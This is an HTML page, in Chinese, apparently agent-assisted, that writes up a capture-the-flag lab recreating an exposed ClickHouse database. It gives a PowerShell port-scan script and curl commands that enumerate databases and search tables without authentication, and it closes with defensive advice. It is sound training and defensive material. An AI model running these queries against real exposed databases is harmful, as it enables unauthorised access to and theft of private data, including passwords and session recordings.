@@ -1,0 +1,70 @@
+<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>01 · Open Deepseek Database —— 暴露在互联网上的数据库 · Wiz Masterclass 通关复盘</title><link rel="stylesheet" href="style.css">
+</head><body><header><nav>
+<a href="index.html">← 总览</a><span class="crumb">Wiz Bug Bounty Masterclass · 9/9 · GLM Agent 协作复盘</span>
+<div class="pager"><a href="wu-00.html">← 方法论总纲</a><a href="wu-02.html">航空数据泄露 →</a></div></nav></header>
+<main><article><h1>01 · Open Deepseek Database —— 暴露在互联网上的数据库</h1>
+<blockquote><p>系列第 1 题 · 对应真实事件：2025 年 1 月某 AI 公司生产数据库无认证暴露<br>（题面原文称 "Based on a real critical finding from January 2025 that exposed<br>sensitive AI company data to the internet"）· 我的净耗时：约 15 分钟</p></blockquote>
+<h2>题面</h2>
+<blockquote><p>You've been given a target URL. Rumor has it there's an exposed database<br>somewhere on this server - left wide open without authentication.<br>Your mission: scan the target, find the database, and extract the flag.</p></blockquote>
+<p>靶场地址：<code>http://&lt;REDACTED_DOMAIN&gt;/</code></p>
+<h2>我的判断路径</h2>
+<p>拿到题面后我先问自己两个问题：</p>
+<ol><li><strong>"exposed database" 最可能是什么形态？</strong> 题面点名复刻 2025 年 1 月的真实事件，</li></ol>
+<p>   而那次事件的主角是 ClickHouse——默认端口 8123（HTTP 接口）和 9000（原生协议）。<br>   所以我的第一假设就是：这两 个端口会有东西。</p>
+<ol><li><strong>先扫全端口还是先扫常见端口？</strong> 我选择 20 个常见服务端口的并行 TCP 探测而不是</li></ol>
+<p>   全端口扫描，因为课程靶场大概率沿用默认配置，3.5 秒能拿到的答案不值得花 10 分钟。</p>
+<h2>过程</h2>
+<h3>1. 侦察：域名、Web 指纹、证书</h3>
+<pre class="code"><code>nslookup &lt;REDACTED_DOMAIN&gt;
+→ 解析到 &lt;REDACTED_IP&gt;（云服务器，反代为 nginx/1.24.0 Ubuntu）
+
+curl http://&lt;REDACTED_DOMAIN&gt;/        → 301 跳转 https
+openssl s_client ... 证书检查          → CN 竟是另一个子域名 &lt;REDACTED_DOMAIN&gt;</code></pre>
+<p>证书 CN 与访问域名不符这个细节给了我额外情报：<strong>这台服务器上托管着多个题目环境</strong>，<br>443 上的默认证书属于另一道题。后来这个判断被证实，还提前给了第 2 题的线索。</p>
+<h3>2. 端口扫描：命中假设</h3>
+<p>用 PowerShell 的 <code>TcpClient.ConnectAsync</code> 做 20 端口并行连接探测（约 3.5 秒）：</p>
+<pre class="code"><code>OPEN: 80
+OPEN: 443
+OPEN: 8080
+OPEN: 8123   ← ClickHouse HTTP
+OPEN: 9000   ← ClickHouse 原生协议</code></pre>
+<p>8123 + 9000 同时开放，与我开局的假设完全吻合。8080 也开着（后来确认属于另一道题）。</p>
+<h3>3. 验证无认证访问</h3>
+<pre class="code"><code>curl http://&lt;REDACTED_DOMAIN&gt;:8123/
+→ Ok.</code></pre>
+<p>根路径返回 <code>Ok.</code> 是 ClickHouse HTTP 接口的标准应答——<strong>没有任何认证质询</strong>，<br>意味着可以直接发查询。</p>
+<h3>4. 数据定位与提取</h3>
+<pre class="code"><code>SHOW DATABASES      → INFORMATION_SCHEMA / deepleak / default / information_schema / system
+SHOW TABLES FROM deepleak → log_stream / metric_stream / rrweb / schema_migrations</code></pre>
+<p>行数：<code>log_stream</code> 355,003 行、<code>metric_stream</code> 129,092 行、<code>rrweb</code> 96,819 行。</p>
+<p>我先抽了每张表前 5 行看形态——全是重复样本，肉眼翻页没有意义。<br>所以我改为<strong>全表特征搜索</strong>：对每张表的文本字段做 <code>ILIKE '%flag%'</code> 和 <code>ILIKE '%{%}%'</code><br>双模式匹配，命中 <code>log_stream.string_values</code>：</p>
+<pre class="code"><code>Security audit log: {&lt;REDACTED&gt;}</code></pre>
+<p>flag 到手，提交即过。</p>
+<h2>关键命令（脱敏后结构可复用）</h2>
+<pre class="code bash"><code>TARGET="http://&lt;REDACTED_DOMAIN&gt;:8123"
+
+curl "$TARGET/"                                   # 存活确认 → Ok.
+curl "$TARGET/" --data-binary "SHOW DATABASES"     # 枚举库
+curl "$TARGET/" --data-binary "SHOW TABLES FROM deepleak"
+curl "$TARGET/" --data-binary \
+  "SELECT DISTINCT string_values FROM deepleak.log_stream \
+   WHERE string_values ILIKE '%flag%' OR string_values ILIKE '%{%}%'"</code></pre>
+<pre class="code powershell"><code># 并行端口探测（Windows 下无需 nmap 的替代）
+$ports = 80,443,3000,3306,5432,6379,8000,8080,8123,9000,9200,11211,27017,9042,1433,5000,8888,4443,8443,4000
+foreach ($p in $ports) { $c = New-Object Net.Sockets.TcpClient;
+  $tasks += @{Port=$p; Client=$c; Task=$c.ConnectAsync($host,$p)} }
+Start-Sleep -Milliseconds 3500
+# 收集 Connected 的条目</code></pre>
+<h2>意外收获（超出 flag 本身的发现）</h2>
+<p>翻 <code>rrweb</code> 表时发现它存的是<strong>管理后台的会话录像</strong>（rrweb 格式的前端录屏事件流），<br>其中 <code>input</code> 类型事件回放出了管理员在登录框里输入的明文密码（值已脱敏）。<br>这正对应真实事件中最致命的部分：会话录像泄露比日志泄露敏感得多——<br>它回放的是<strong>人的行为</strong>，包括输错的密码、粘贴的 token、访问过的页面。</p>
+<h2>失败与弯路</h2>
+<p>本题一次通过，无返工。但有一个流程细节值得记：第一轮 <code>LIMIT 5</code> 预览全是重复行时，<br>我差点准备翻页浏览，及时改成全表特征搜索才在几秒内命中——<br><strong>数据量大时，先定搜索策略再动手，不要用肉眼对抗十万行</strong>。</p>
+<h2>防御视角（如果我是蓝队）</h2>
+<ol><li>数据库服务（ClickHouse/Redis/Mongo…）永不直接暴露公网，收进内网 + 防火墙白名单</li><li>必须启用认证——ClickHouse 默认配置的 <code>default</code> 用户无密码是经典陷阱</li><li>rrweb 这类会话录像属于最高敏数据，加密存储 + 严格访问控制 + 短保留期</li><li>监控出站视角：任何数据库端口出现在公网扫描结果里都应触发告警</li></ol>
+<h2>证据</h2>
+<ul><li><code>evidence/01-1-flag-submitted.png</code> —— 提交成功页面</li></ul>
+<p>  【待我确认：请检查截图中 flag 输入框是否仍显示 flag 原文；若是，请重截一张<br>  仅含成功状态的图替换，或告诉我位置，我来裁剪】</p></article></main>
+<footer>基于 GLM 驱动的 Agent 协作完成（2026-10-24）· <a href="https://www.wiz.io/bug-bounty-masterclass/certificate/43a82202-6aaa-4a0b-b43a-118f380d8af1" target="_blank" rel="noopener">官方证书</a> · 全部敏感内容已脱敏（见仓库 REDACTION.md）</footer>
+</body></html>
